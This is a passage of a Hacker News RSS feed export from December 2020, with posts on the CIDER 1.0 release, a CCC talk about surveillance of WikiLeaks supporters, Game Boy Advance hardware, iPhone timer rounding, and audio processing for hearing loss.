certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
after a long period of hibernation. In hindsight probably the work
I did on nREPL was even more important than the work I did on CIDER.</p>

<p>Over the years a big ecosystem of packages grew around CIDER and nREPL
and they became important parts of the Clojure development
tooling. Today CIDER and nREPL face a lot of competition, but they are still
evolving at a steady pace, occasionally innovating, and serving as inspiration for
other tools. That makes me proud of the work we’ve done over the past 8 and a half years,
even if fewer and fewer people are using CIDER and Emacs every year.</p>

<p>One thing that constantly eluded me, however, was a 1.0 release. I
guess I’m the one to blame for this not happening sooner, as I had
some really grand ambitions for CIDER 1.0 (and some rather high
quality standards to go with them) and I was optimistic that somehow my plans would
become a reality in a reasonable amount of time.  Clearly I was
mistaken. Between me having to split my time between a dozen OSS projects
and most of them currently having no other active maintainers but me,
it eventually became obvious that the grand plans will have to wait
for CIDER 2.0. Grand plans and ambitions for world domination aside,
CIDER has been pretty stable for a while now and it seems to get the
job done. And there’s also the theory that if a piece of software has
some (happy) users then it qualifies for a 1.0 release… Oh, well…</p>

<p>Today the long wait is over - <a href="https://github.com/clojure-emacs/cider/releases/tag/v1.0.0">CIDER 1.0
(“Sofia”)</a>
is officially out!<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>  There’s nothing particularly interesting in this
release - it’s almost the same as CIDER 0.26. If you notice one
difference, it would probably be that commands that act on the symbol
at point (e.g. <code>cider-doc</code>) will no longer prompt you to confirm the
symbol. The old default was a mistake and I decided to adjust it for
this grand release. If you notice another difference, it’d probably be
that CIDER is officially using SemVer now. I still have to define
what exactly is going to constitute a breaking change going forward (e.g.
are changes to keybindings breaking changes?), but I’m reasonably
sure the adherence to SemVer will make CIDER upgrades less painful
for everyone.</p>

<p>There are many things that prompted me to do the 1.0 release now, but
probably the most important factor was that 2020 was such a horrible
year for all of us. I felt we needed all the good news we could
get to counter all the pain and suffering we’ve had to endure. While I
can’t help the fight against the pandemic, I hope I can cheer you up a
bit, by delivering another iteration of your favorite software that rocks.</p>

<p>So, what’s next? I don’t really have any particular plans for CIDER 1.1, so we’ll see how exactly it’s
going to shape up. Some vague ideas that have been floating in my mind are proper support for sideloading,
adding support for dynamic middleware loading, and improvements to the session management. No promises, though.
I’m also aiming to finally do an nREPL 1.0 release at some point. There are plenty of tickets
marked with the label “Good First Issue” on CIDER’s issue tracker, so if you’re looking for
more fun challenges after the end of the “Advent of Code” be my guest. I can definitely use all the help
I can get.</p>

<p>One thing is certain, though - CIDER will always stay true to its guiding principles:</p>

<ul>
  <li>REPL-first (as opposed to relying on static code analysis)</li>
  <li>Community-first (CIDER is defined by its community)</li>
  <li>Keep on rocking in a Lisp world!</li>
</ul>

<p>I’m writing this article while enjoying a bottle of proper (hard) French cider, so I think
I should wrap it up before I start enjoying myself too much.
Thanks to everyone who has been a part of CIDER’s community over the years! Thanks to everyone who has contributed to the project and supported it! Thanks
to everyone who still loves Emacs and CIDER! This release is for all of you!
Cheers!</p>



  </div></div>]]>
            </description>
            <link>https://metaredux.com/posts/2020/12/28/cider-1-0.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25568181</guid>
            <pubDate>Tue, 29 Dec 2020 09:33:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CIA vs. Wikileaks [video]]]>
            </title>
            <description>
<![CDATA[
Score 320 | Comments 226 (<a href="https://news.ycombinator.com/item?id=25567659">thread link</a>) | @pdkl95
<br/>
December 28, 2020 | https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=andy">andy</a>

</p>

<p><a href="https://media.ccc.de/c/rc3/rC3" rel="tag">rC3</a>
<a href="https://media.ccc.de/c/rc3/Ethics,%20Society%20&amp;%20Politics" rel="tag">Ethics, Society &amp; Politics</a>
Playlists:
<a href="https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks/playlist">'rc3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks/audio">audio</a></p>
<!-- %h3 About -->
<p>In this talk, I aim to report and show a collection of observations, physical, visual and other evidence of the last years incidents that strongly indicate a context of the US Central Intelligence Agency and/or potentially other entities of the US Government actions against Wikileaks and surrounding persons and organisations.</p>

<p>While the area of technical surveillance, SIGINT/COMINT and related Organizations and Methods have been more or less well understood in the hacker scene, the tactics and methods experienced and discussed in this talk are of a different type: For the moment, I would call it "initimidation surveillance" as it lacks the aspect of "covert" type of actions.</p>

<p>On the last Chaos Communication Congress, I have analysed the technical aspects of the surveillance in and surrounding the ecuadorian embassy where Julian Assange stayed; this talk shows what happened to other people - friends of Assange, supporters of Wikileaks etc - not only in England, but also in other countries / other parts of the world. </p>

<p>The idea is to not only show the scope of activities but also to contribute to a better understanding of these tactics, that might be applied also in completely different political environments where governments act in extralegal ways against activities they dislike, although they that are not a crime or easily criminalized.</p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567659</guid>
            <pubDate>Tue, 29 Dec 2020 07:44:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner's Guide to Houseplants]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 39 (<a href="https://news.ycombinator.com/item?id=25565349">thread link</a>) | @Pjki889
<br/>
December 28, 2020 | https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502 | <a href="https://web.archive.org/web/*/https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565349</guid>
            <pubDate>Tue, 29 Dec 2020 00:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teaching the Unfortunate Parts]]>
            </title>
            <description>
<![CDATA[
Score 122 | Comments 90 (<a href="https://news.ycombinator.com/item?id=25564666">thread link</a>) | @gary_bernhardt
<br/>
December 28, 2020 | https://www.executeprogram.com/blog/teaching-the-unfortunate-parts | <a href="https://web.archive.org/web/*/https://www.executeprogram.com/blog/teaching-the-unfortunate-parts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.executeprogram.com/blog/teaching-the-unfortunate-parts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564666</guid>
            <pubDate>Mon, 28 Dec 2020 23:37:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architecture of the Game Boy Advance]]>
            </title>
            <description>
<![CDATA[
Score 253 | Comments 80 (<a href="https://news.ycombinator.com/item?id=25564619">thread link</a>) | @biwasa
<br/>
December 28, 2020 | https://www.copetti.org/writings/consoles/game-boy-advance/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/game-boy-advance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the Game Boy Advance is quite impressive for a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo’s <em>signature</em> GPU. Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the Game Boy!</em> It’s effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new?</h4><p>Before ARM Holdings (currently “Arm”) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn’s computers, Apple’s Newton, Nokia’s phones and the Panasonic 3DO.
Nintendo’s chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU’s resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Debug module that allows hardware breakpoints, watchpoints and allows the system to be halted while debugging.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence on the final design of this console. Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Although this console was marketed as a 32-bit system, the majority of its memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction fetch. Only critical sections should use the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility?</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/writings/consoles/game-boy/#graphics">Game Boy</a>, the graphics core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>Compared to previous Game Boys we now have a colour LCD screen that can display up to 32,768 colours (15-bit). It has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>
<img name="image_cover" alt="Image" width="630" height="273" src="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png" loading="auto"></picture></a><figcaption>Memory architecture of the PPU</figcaption></div><p>We have the following regions of memory in which to distribute our graphics:</p><ul><li>96 KB 16-bit <strong>VRAM</strong> (Video RAM): Where 64 KB store background graphics and 32 KB store sprite graphics.</li><li>1 KB 32-bit <strong>OAM</strong> (Object Attribute Memory): Stores up to 128 sprite entries (not the graphics, just the indices and attributes). Its bus is optimised for fast rendering.</li><li>1 KB 16-bit <strong>PAL RAM</strong> (Palette RAM): Stores two palettes, one for backgrounds and the other for sprites. Each palette contains 256 entries of 15-bit colours each, colour ‘0’ being <em>transparent</em>.</li></ul><h4 id="constructing-the-frame">Constructing the frame</h4><p>If you’ve read the previous articles you’ll find the GBA familiar, although there is additional functionality that may surprise you, and don’t forget that this console runs on two AA batteries.</p><p>I’m going to borrow the graphics of Sega’s <em>Sonic Advance 3</em> to show how a frame is composed.</p><div><ul><li id="tab-2-1-tiles-link"><a href="#tab-2-1-tiles">Tiles</a></li><li id="tab-2-2-backgrounds-link"><a href="#tab-2-2-backgrounds">Backgrounds</a></li><li id="tab-2-3-sprites-link"><a href="#tab-2-3-sprites">Sprites</a></li><li id="tab-2-4-result-link"><a href="#tab-2-4-result">Result</a></li></ul><div><div id="tab-2-1-tiles"><h4>Tiles</h4><div><figcaption>4bpp Tiles found in VRAM<br>Last block is reserved for sprites</figcaption></div><p>GBA’s tiles are strictly 8x8 pixel bitmaps, they can use 16 colours (4bpp) or 256 colours (8bpp). 4bpp tiles consume 32 bytes, while 8bpp ones take 64 bytes.</p><p>Tiles are grouped into <strong>charblocks</strong>. Each block is reserved for a specific type of layer.</p><p>Because each charblock is designed to fit in 16 KB of memory, up to 256 8bpp tiles or 512 4bpp tiles can be stored per block. There are six charblocks allocated, which combined require 96 KB of memory: The exact amount of VRAM this console has.</p><p>Four charblocks are used for backgrounds and two are used for sprites.</p></div><div id="tab-2-2-backgrounds"><h4>Backgrounds</h4><div><figcaption>Affine background layers in use<br>Layer 3 will be scaled to simulate water effects</figcaption></div><p>The background layer of this system has improved significantly since the Game Boy Color. It finally includes some features found in the <a href="https://www.copetti.org/writings/consoles/super-nintendo/">Super Nintendo</a> (remember the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#unique-features">affine transformations</a>?).</p><p>The PPU can draw up to four background layers. The capabilities of each one will depend on the selected mode of operation:</p><ul><li><strong>Mode 0</strong>: Provides four static layers.</li><li><strong>Mode 1</strong>: Only three layers are available, although one of them is <strong>affine</strong> (can be rotated and/or scaled).</li><li><strong>Mode 2</strong>: Supplies two affine layers.</li></ul><p>Each layer be up to 512x512 pixels wide. If it’s an affine one then it will be up to 1024x1024 pixels.</p></div><div id="tab-2-3-sprites"><h4>Sprites</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/sprites.189dd68dc0757e2dd0d26c3a99ed483f51688f3eefd06d8af5cb65639c45f751.png" loading="auto"></picture></a><figcaption>Rendered Sprite layer</figcaption></div><p>The size of a sprite can be up to 64x64 pixels wide, yet for having such a small screen they will end up occupying a big part of it.</p><p>If that wasn’t enough, the PPU can now apply <strong>affine transformations</strong> to sprites!</p><p>Sprite entries are 32-bit wide and their values can be divided in two groups:</p><ul><li><strong>Attributes</strong>: Contains x/y position, h/v flipping, size, shape (square or rectangle), sprite type (affine or regular) and location of first tile.</li><li><strong>Affine data</strong>: Only used if the sprite is affine, specify scaling and rotation.</li></ul></div><div id="tab-2-4-result"><h4>Result</h4><div><a href="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png"><picture>
<img name="image_cover" alt="Image" width="240" height="160" src="https://www.copetti.org/images/consoles/gba/sonic/result.d7e650e0d040e2df56f7877454319a304be08ebf0714ac9a1320fb2403189392.png" loading="auto"></picture></a><figcaption>All layers merged (<i>Tada!</i>)</figcaption></div><p>As always, the PPU will combine all layers automatically, but it’s not over yet! The system has a couple of effects available to apply over these layers:</p><ul><li><strong>Mosaic</strong>: Makes tiles look more <em>blocky</em>.</li><li><strong>Alpha blending</strong>: Combines colours of two overlapping layers resulting in transparency effects.</li><li><strong>Windowing</strong>: Divides the screen into two different <em>windows</em> where each one can have its own separate graphics and effects, the outer zone of both windows can also be provided with tiles.</li></ul><p>On the other side, in order to update the frame there are multiple options available:</p><ul><li>Command the <strong>CPU</strong> during VBlank/HBlank: The <em>traditional way</em>.</li><li>Use the <strong>DMA Controller</strong>: DMA provides transfer rates ~10x faster and can be scheduled during VBlank and HBlank. This console provides 4 DMA channels (two reserved for sound, one for critical operations and the other for general purpose). Bear in mind that the controller will halt the CPU during the operation (although it may hardly notice it!).</li></ul></div></div></div><h4 id="beyond-tiles">Beyond Tiles</h4><p>Sometimes we may want to compose a background from which the tile engine won’t be able to draw all required graphics. Now, modern consoles addressed this by implementing a <strong>frame-buffer</strong> architecture but this is not possible when there’s very little RAM… Well, the GBA happens to have 96 KB of VRAM which is enough to allocate a <strong>bitmap</strong> with the dimensions of our LCD screen.</p><p>Good news is that the PPU actually implemented this functionality by including three extra modes, these are called <strong>bitmap modes</strong>:</p><ul><li><strong>Mode 3</strong>: Allocates a single fully-coloured (8bpp) frame.</li><li><strong>Mode 4</strong>: Provides two frames with half the colours (4bpp) each.</li><li><strong>Mode 5</strong>: There’s two fully-coloured frames with half the size each (160x128 pixels).</li></ul><p>The reason for having two bitmaps is to enable <strong>page flipping</strong>: Drawing over a displayed bitmap can expose some weird artefacts during the process. If instead we manipulate another one then none of the glitches will be shown to the user. Once the second bitmap is finished the PPU can be updated to point to the second one, effectively swapping the displayed frame.</p><div><p>Overall it sounds like a cutting-the-edge feature, however most games held on to the tile engine. Why? Because in practice it <strong>costs a lot of CPU resources</strong>.</p><p>You see, while using a tile engine the CPU can delegate most of the computations to the graphics chip. By contrast, the frame-buffer system that the PPU provides is limited to only displaying that segment of memory as a <strong>single background layer</strong>, that means no more individual affine transformations, layering …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.copetti.org/writings/consoles/game-boy-advance/">https://www.copetti.org/writings/consoles/game-boy-advance/</a></em></p>]]>
            </description>
            <link>https://www.copetti.org/writings/consoles/game-boy-advance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564619</guid>
            <pubDate>Mon, 28 Dec 2020 23:32:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why the iPhone Timer app displays a fake time]]>
            </title>
            <description>
<![CDATA[
Score 220 | Comments 74 (<a href="https://news.ycombinator.com/item?id=25563708">thread link</a>) | @_antix
<br/>
December 28, 2020 | https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/ | <a href="https://web.archive.org/web/*/https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://mp.weixin.qq.com/s/VDmjQacZNEmnynN6PylFhw" title="Chinese translation of this article">本文的中文翻译</a></p>
<p>While building my event timer app called <a href="https://stagetimer.io/">stagetimer.io</a> I came across a peculiarity with displaying time and found out that the iPhone timer addresses it by showing us a fake time. By definition, a countdown shows how much time is left. So if the countdown says 5s we assume there are 5 seconds left. But that’s not the whole truth.</p>

<p>The iPhone countdown timer doesn’t strictly display the correct time but adds 500ms, or half a second, to the remaining time. It does this to make the reading of time more intuitive for humans. The alarm at the end of the countdown is not affected by this 500ms inaccuracy.</p>

<p>Javascript likes to use milliseconds when dealing with time, 1000ms equals 1s. Here is an example of a 5s countdown that starts at 5000ms and uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval">setInterval()</a> function to deduct 10ms every 10ms, simple enough. Milliseconds are converted to seconds by dividing by 1000 and rounding down like so: <code>Math.floor(milliseconds / 1000)</code></p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds.gif" data-still="/img/writing/5s-timer-seconds.png" alt="5s countdown timer showing only seconds">
  </figure>
</div>
<p>The timer jumps to 4s right when hitting start and once the timer switches to 0s there are still 1s to go. This makes a lot of sense when counting up, for example, 10:00 is displayed during the first minute of 10 AM, not 10:01, always rounding down. But for a countdown timer, this is counterintuitive. It is easier to understand if the timer has a fractional seconds display.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-fractions.gif" data-still="/img/writing/5s-timer-seconds-fractions.png" alt="5s countdown timer showing seconds and its fractions">
  </figure>
</div>
<p>Now the timer displays 0.9s seconds instead of 0s to show clearly that there is still time left on the clock. However, I didn’t want to show fractional seconds for my timer.</p>

<p>Now I was curious how my iPhone solves this conundrum. So I set my iPhone timer to 5s:</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-iphone.gif" data-still="/img/writing/5s-timer-iphone.png" alt="5s countdown timer on the iPhone">
  </figure>
</div>
<p>After I click “Start” the iPhone timer shows 5s, not 4s like in the example above. But it switches to 4s before a full second expired. It then counts proper seconds until it reaches 0s which, again, is not a full second. And if you tap “Pause” just after it jumped to 0s it will promptly jump back to 1s to show you that there is, in fact, still some time left on the countdown.</p>
<p>I figured that the good folks at Apple add an extra fake 500ms to the actual time to start that countdown display at 5s instead of 4s. The timer ends and the phone beeps if the actual time hits 0s and the “fake” time hits 500ms. So they faced the same problem I did and came up with a practical solution. After all, if you start a 5s countdown, it should start at 5s right? For illustration, here is my simple timer doing the same trick.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-fake-seconds.gif" data-still="/img/writing/5s-timer-fake-seconds.png" alt="5s countdown timer showing fake seconds">
  </figure>
</div>
<p>So there you have it, the iPhone timer is technically lying a little bit to you.</p>

<p>Some have pointed out that the problem could be solved more easily by rounding to the nearest second or rounding up instead of rounding down. This is correct. Suppose we have <code>5459543ms</code> that we want to bring into the traditional form <code>HH:mm:ss</code>.</p>
<p>I first divided the number into hours, minutes, and seconds with the help of some modular arithmetic and applied the rounding afterward. Rounding down results in <code>01:30:59</code>, which is correct, but rounding to the nearest integer or rounding up results in the impossible time <code>02:31:60</code>.</p>
<pre><code>time = <span>5459543</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p>However, rounding the time to seconds first <code>5460000ms</code>, and breaking it down afterward yields the same result as described above with adding 500ms, namely <code>01:31:00</code>.</p>
<pre><code>time = <span>5460000</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p><em>Edit 2: In an earlier version I messed up my rounding as described. Many helpful, as well as helpful and insulting, comments pointed out my error. So in addition to learning about counting time I also learned how it feels to be wrong on the internet</em> 😅</p>
<h3 id="references"><a href="#references">¶</a> References:</h3>
<ul>
<li><a href="https://codepen.io/lhermann/pen/wvzPxXj">The code from the animations in this article</a></li>
</ul>
</div><div><p>I would love to hear from you if this article was helpful or if you have any questions</p><a href="https://twitter.com/_lhermann">Twitter</a></div></div>]]>
            </description>
            <link>https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25563708</guid>
            <pubDate>Mon, 28 Dec 2020 21:56:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Experimenting on My Hearing Loss]]>
            </title>
            <description>
<![CDATA[
Score 139 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25562273">thread link</a>) | @paddlesteamer
<br/>
December 28, 2020 | https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/ | <a href="https://web.archive.org/web/*/https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    

<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/deafsign.png" title="Hear"></p><p><strong>WARNING: Some of the audios shared in this blog post may be disturbing and hurt your/your pet’s ears. Don’t play them at high volume.</strong> </p>
<p>I have a slight <a href="https://en.wikipedia.org/wiki/Sensorineural_hearing_loss" target="_blank" rel="noopener">sensorineural hearing loss</a> in both of my ears from birth. My hearing loss isn’t that serious but I need to use hearing aids in my daily life. Lately, I was thinking about altering my computer’s audio output according to my <a href="https://en.wikipedia.org/wiki/Audiogram" target="_blank" rel="noopener">audiogram</a>. An audiogram is basically a frequency-dB threshold graph. You can see my audiogram below:</p>
<p><img src="https://0x90.psaux.io/2020/12/19/Experimenting-On-My-Hearing-Loss/audiogram.png" title="audiogram"></p>

<p>It’s easy to read an audiogram. In audiograms, 0 dB indicates the quietest sound that a normal young person can hear. Here, the red line shows my right ear’s threshold values and the blue one belongs to my left ear’s. Let’s follow the red line. According to my audiogram, at the frequency of 250 Hz, the lowest I can hear is the sounds at 25 dB. At 6000Hz, I can’t hear any sound below 60 dB. Audiograms usually show threshold dBs between 125 Hz and 8000 Hz because that is the frequency range of the human voice.</p>
<p>What I want to do is to add a dynamic gain to the output audio depending on its frequency range. Simply, I want to be able to use my computer without the need for my hearing aids. To achieve this, I’m going to write a <a href="https://ladspa.org/" target="_blank" rel="noopener">LADSPA</a> plugin and use it with <a href="https://www.freedesktop.org/wiki/Software/PulseAudio/" target="_blank" rel="noopener">Pulseaudio</a>. Here is my previous <a href="https://0x90.psaux.io/2020/12/07/How-To-Write-A-LADSPA-Plugin/">post</a> on how to write one. In this post, I won’t get into LADSPA, I’ll just talk about my explorations on some audio files. </p>
<p>Before we start you may want to read about <a href="https://en.wikipedia.org/wiki/Sampling_(signal_processing)" target="_blank" rel="noopener">sampling</a> and <a href="https://en.wikipedia.org/wiki/Fourier_transform" target="_blank" rel="noopener">fourier transform</a>. A better explanation of the fourier transform could be found <a href="http://www.jezzamon.com/fourier/index.html" target="_blank" rel="noopener">here</a>. </p>
<p>First, let’s generate audio from sine waves with frequencies from 440 Hz to 8000 Hz and a sample rate of 44100 Hz:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br></pre></td><td><pre><span><span>from</span> scipy.io <span>import</span> wavfile</span><br><span></span><br><span><span>import</span> numpy <span>as</span> np</span><br><span></span><br><span><span><span>def</span> <span>generateSamples</span><span>(sampleRate)</span>:</span></span><br><span>    startFreq = <span>440</span> </span><br><span>    endFreq = <span>8000</span> </span><br><span></span><br><span>    freqInc = <span>20</span> </span><br><span>    incPeriod = <span>0.05</span> </span><br><span></span><br><span>    incSampleCount = int(sampleRate*incPeriod)</span><br><span>    samples = np.array([])</span><br><span></span><br><span>    freq = startFreq</span><br><span>    t = <span>0.0</span></span><br><span>    <span>while</span> freq &lt; endFreq:</span><br><span>        tarray = np.linspace(t, t + incPeriod, incSampleCount, endpoint=<span>False</span>)</span><br><span></span><br><span>        newSamples = np.sin(<span>2</span> * np.pi * freq * tarray)</span><br><span>        newSamples *= <span>0.05</span> </span><br><span></span><br><span>        samples = np.append(samples, newSamples)</span><br><span></span><br><span>        freq += freqInc</span><br><span>        t += incPeriod</span><br><span></span><br><span>    <span>return</span> samples</span><br><span></span><br><span><span>if</span> __name__ == <span>"__main__"</span>:</span><br><span>    sampleRate = <span>44100</span></span><br><span></span><br><span>    samples = generateSamples(sampleRate)</span><br><span></span><br><span>    wavfile.write(<span>"generated.wav"</span>, sampleRate, samples)</span><br></pre></td></tr></tbody></table></figure>

<p>And the output is:</p>



<p>What we’re going to do is, first take a little part of the samples that we have generated. This will be our <em>window</em>. We’ll do a Fourier transform on this window and get into the frequency domain. Then we’ll find the frequency with the highest <a href="https://blog.demofox.org/2015/04/14/decibels-db-and-amplitude/" target="_blank" rel="noopener">dB</a> which will be our dominant frequency. We’ll determine how much gain is needed at that frequency according to the audiogram and apply it to the window. We’ll repeat this for all windows. We’re going to use <em>python</em> to achieve all this for the sake of convenience.</p>
